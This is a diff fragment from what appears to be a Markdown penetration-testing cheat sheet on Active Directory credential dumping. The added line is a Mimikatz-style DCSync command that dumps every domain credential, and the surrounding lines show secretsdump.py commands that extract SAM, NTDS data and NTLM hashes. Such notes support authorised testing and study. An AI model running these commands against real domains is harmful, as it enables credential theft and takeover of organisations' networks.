@@ -92,6 +92,8 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
     ```
   - **Remote(DCSync)**:
   ```
+  #dump NTDS
+  lsadump::dcsync /domain:<DomainName> /all
   #Extract just NTDS data
   secretsdump.py -just-dc <DomainName>/<AD_Admin_User>@MACHINE_IP 
   #Extract NTLM hashes
